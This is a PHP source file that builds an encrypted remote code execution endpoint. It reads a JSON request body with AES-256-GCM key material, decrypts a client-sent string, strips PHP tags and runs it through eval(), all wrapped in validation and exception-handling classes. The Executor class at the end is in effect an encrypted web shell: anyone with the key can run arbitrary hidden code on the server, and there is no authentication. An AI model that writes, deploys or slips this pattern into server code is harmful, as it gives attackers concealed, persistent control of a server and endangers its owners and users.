<?php

set_exception_handler(function (Throwable $exception): void {
    $currentDate = new DateTime();
    $errorStackMessages = [$exception->getMessage()];
    while ($previous = $exception->getPrevious()) {
        $errorStackMessages[] = $previous->getMessage();
    }
    $errorObj = [
        "timestamp" => $currentDate->format('c'),
        "error_messages" => $errorStackMessages
    ];
    header('Content-Type: application/json');
    $response_code = 500;
    if ($exception instanceof UserException) {
        $response_code = 400;
    }
    http_response_code($response_code);
    echo json_encode($errorObj);
});

class UserException extends Exception
{
    public function __construct($message = '', $code = 0, Throwable $previous = null)
    {
        parent::__construct($message, $code, $previous);
    }
}

class MultipleExceptions extends Exception
{
    public function __construct(
        private readonly array $exceptions,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = $this->createMessage();
        parent::__construct($message, $code, $previous);
    }

    private function createMessage(string $message = "Multiple Exceptions"): string
    {
        $message = "{$message}: ";
        foreach ($this->exceptions as $exception) {
            if (!method_exists($exception, 'getMessage')) {
                $message .= "Exception does not have a message...";
                continue;
            }
            $message .= "\"{$exception->getMessage()}\" \n";
        }
        return $message;
    }

    public function getExceptions()
    {
        return $this->exceptions;
    }
}

class UncallableFunctionException extends Exception
{
    public function __construct(
        private readonly string $uncallableFunction,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = "Function \"{$this->uncallableFunction}\" is not callable";
        parent::__construct($message, $code, $previous);
    }

    public function getUncallableFunction(): string
    {
        return $this->uncallableFunction;
    }
}

class UnavailableCipherException extends Exception
{
    public function __construct(
        private readonly string $unavailableCipher,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = "Cipher \"{$this->unavailableCipher}\" is not available";
        parent::__construct($message, $code, $previous);
    }
    public function getUnavailableCipher(): string
    {
        return $this->unavailableCipher;
    }
}

class MissingRequirementException extends Exception
{
    public function __construct(
        private readonly string $missingRequirement,
        int $code = 0,
        Throwable $previous = null
    ) {
        $message = "Requirement \"{$this->missingRequirement}\" is missing";
        parent::__construct($message, $code, $previous);
    }
    public function getUnavailableRequirement(): string
    {
        return $this->missingRequirement;
    }
}

interface Decryptor
{
    public function decrypt(string $data): string|false;
}

interface Tester
{
    /**
     * Launch all tests
     * 
     * @return void
     * @throws Exception
     */
    public function launch(): void;
}

interface DecryptorTester extends Tester
{
    public function getDecryptor(): string;
}

trait Singleton
{
    private static array $instances = [];
    private function __construct()
    {
    }
    final protected function __clone()
    {
    }
    final public static function getInstance(...$args): self
    {
        $className = static::class;
        if (!isset(self::$instances[$className])) {
            self::$instances[$className] = new $className(...$args);
        }
        return self::$instances[$className];
    }
}

trait ClientDataValidator
{
    /**
     * @return array<string, ClassObjTyping>
     */
    abstract private function getClassObjs(): array;
    /**
     * @return void
     * @throws MissingRequirementException
     * @throws TypeError
     */
    private function validateSingle(
        string $obj,
        ClassObjTyping $classObjTyping,
        array $clientArgs
    ): void {
        if (!isset($clientArgs[$obj])) {
            if ($classObjTyping->optional == ClassObjOptional::OPTIONAL) {
                return;
            }
            throw new MissingRequirementException($obj);
        }
        $clientArgType = gettype($clientArgs[$obj]);
        $expectedType = $classObjTyping->type->value ?? $classObjTyping->type;
        if ($clientArgType != $expectedType) {
            throw new TypeError("$obj type is \"$clientArgType\", but the server expected type \"$expectedType\"");
        }
    }
    /**
     * @throws UserException
     * @return void
     */
    final public function validate(?array $clientArgs): void
    {
        if (!$clientArgs) {
            throw new UserException("Client did not provide any data");
        }
        $classObjs = $this->getClassObjs();
        $exceptionsArray = [];
        foreach ($classObjs as $obj => $classObjTyping) {
            try {
                $this->validateSingle($obj, $classObjTyping, $clientArgs);
            } catch (Exception $e) {
                $exceptionsArray[] = $e;
            }
        }
        if ($exceptionsArray !== []) {
            throw new UserException(
                message: "Fails to validate use data",
                previous: new MultipleExceptions($exceptionsArray)
            );
        }
    }
}

enum Typing: string
{
    case STRING = "string";
    case BOOLEAN = "boolean";
    case INTEGER = "integer";
    case DOUBLE = "double";
    case ARRAY = "array";
    case OBJECT = "object";
    case RESOURCE = "resource";
    case RESOURCE_CLOSED = "resource (closed)";
    case NULL = "NULL";
    case UNKNOWN_TYPE = "unknown type";
}

enum ClassObjOptional: string
{
    case OPTIONAL = "optional";
    case MANDATORY = "mandatory";
}

class ClassObjTyping
{
    public function __construct(public Typing $type, public ClassObjOptional $optional)
    {
    }
}

class OpensslDecryptor implements Decryptor
{
    use Singleton;
    use ClientDataValidator;
    private readonly string $cipher_algo;
    private readonly string $passphrase;
    private readonly string $tag;
    private readonly string $iv;
    private int $options = 0;
    private string $aad = "";
    public static string $wantedOpenSslCipher = "aes-256-gcm";
    private function getClassObjs(): array
    {
        return [
            "cipher_algo" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "passphrase" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "tag" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "options" => new ClassObjTyping(Typing::INTEGER, ClassObjOptional::OPTIONAL),
            "iv" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
            "aad" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
        ];
    }
    private function __construct(array $args)
    {
        $this->validate($args);
        $this->cipher_algo = $args["cipher_algo"];
        $this->passphrase = hex2bin((string) $args["passphrase"]);
        $this->iv = hex2bin((string) $args["iv"]);
        $this->tag = hex2bin((string) $args["tag"]);
        if (isset($args["options"])) {
            $this->options = $args["options"];
        }
        if (isset($args["aad"])) {
            $this->aad = $args["aad"];
        }
    }
    final public function decrypt(string $data): string|false
    {
        return openssl_decrypt(
            $data,
            $this->cipher_algo,
            $this->passphrase,
            $this->options,
            $this->iv,
            $this->tag,
            $this->aad
        );
    }
}

class McryptDecryptor implements Decryptor
{
    use Singleton;
    private readonly string $cipher;
    private readonly string $key;
    private $mode;
    private readonly string $iv;
    private function __construct(array $args)
    {
        $this->cipher = $args["cipher"];
        $this->key = $args["key"];
        $this->mode = $args["mode"];
        $this->iv = $args["iv"];
    }
    public function decrypt(string $data): string|false
    {
        /** @phpstan-ignore-next-line */
        return mcrypt_decrypt(
            $this->cipher,
            $this->key,
            $data,
            $this->mode,
            $this->iv
        );
    }
}

class TestPhpOpenssl implements DecryptorTester
{
    use Singleton;
    private array $opensslFunctions = [
        "openssl_decrypt",
        "openssl_get_cipher_methods"
    ];
    private function __construct()
    {
    }

    final public function testOpensslFunctions(): ?array
    {
        $uncallableFunctions = [];
        $callableFunctions = [];
        foreach ($this->opensslFunctions as $funcName) {
            if (!is_callable($funcName)) {
                $uncallableFunctions[] = new UncallableFunctionException($funcName);
            }
            $callableFunctions[] = $funcName;
        }
        if ($uncallableFunctions !== []) {
            throw new MultipleExceptions($uncallableFunctions);
        }
        return $callableFunctions;
    }
    final public function testOpensslCipher(): ?string
    {
        $ciphers = openssl_get_cipher_methods();
        if (in_array(OpensslDecryptor::$wantedOpenSslCipher, $ciphers)) {
            return OpensslDecryptor::$wantedOpenSslCipher;
        }
        throw new UnavailableCipherException(OpensslDecryptor::$wantedOpenSslCipher);
    }

    public function launch(): void
    {
        $exceptionArray = [];
        $functions = [
            fn (): ?array => $this->testOpensslFunctions(),
            fn (): ?string => $this->testOpensslCipher()
        ];
        foreach ($functions as $func) {
            try {
                $func();
            } catch (Exception $e) {
                $exceptionArray[] = $e;
            }
        }
        if ($exceptionArray !== []) {
            throw new MultipleExceptions($exceptionArray);
        }
    }
    public function getDecryptor(): string
    {
        return OpensslDecryptor::class;
    }
}


class GetPHP
{
    use Singleton;

    /**
     * @var array<DecryptorTester> $decryptorTesters
     */
    private array $decryptorTesters = [];
    private function __construct()
    {
        $this->decryptorTesters[] = TestPhpOpenssl::getInstance();
    }
    public function getDecryptor(): string
    {
        $exceptions = [];
        foreach ($this->decryptorTesters as $tester) {
            try {
                $tester->launch();
                return $tester->getDecryptor();
            } catch (Exception $e) {
                $exceptions[] = $e;
            }
        }
        if ($exceptions !== []) {
            throw new MultipleExceptions($exceptions);
        }
        throw new MissingRequirementException("No decryptors are available");
    }
}

class Executor
{
    use Singleton;
    use ClientDataValidator;
    private readonly Decryptor $decryptor;
    private readonly array $decryptorData;
    private function getClassObjs(): array
    {
        return [
            "decryptor" => new ClassObjTyping(Typing::ARRAY, ClassObjOptional::MANDATORY),
        ];
    }
    private function __construct()
    {
        $rawClientData = file_get_contents('php://input');
        try {
            $clientData = json_decode(
                json: $rawClientData,
                associative: true,
                flags: JSON_THROW_ON_ERROR
            );
        } catch (Exception $e) {
            throw new UserException("Server is unable to parse user data", $e->getCode(), $e);
        }
        $this->validate($clientData);
        $this->decryptorData = $clientData["decryptor"];
        $decryptorPtr = GetPHP::getInstance()->getDecryptor();
        $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
    }

    private function formatPhpString(string &$phpString): void
    {
        $removeSubStrings = ["<?php", "?>", "<?"];
        foreach ($removeSubStrings as $subString) {
            $phpString = str_replace($subString, "", $phpString);
        }
    }
    public function exec(string $encryptedPhpString): mixed
    {
        $phpString = $this->decryptor->decrypt($encryptedPhpString);
        $this->formatPhpString($phpString);
        return eval($phpString);
    }
}
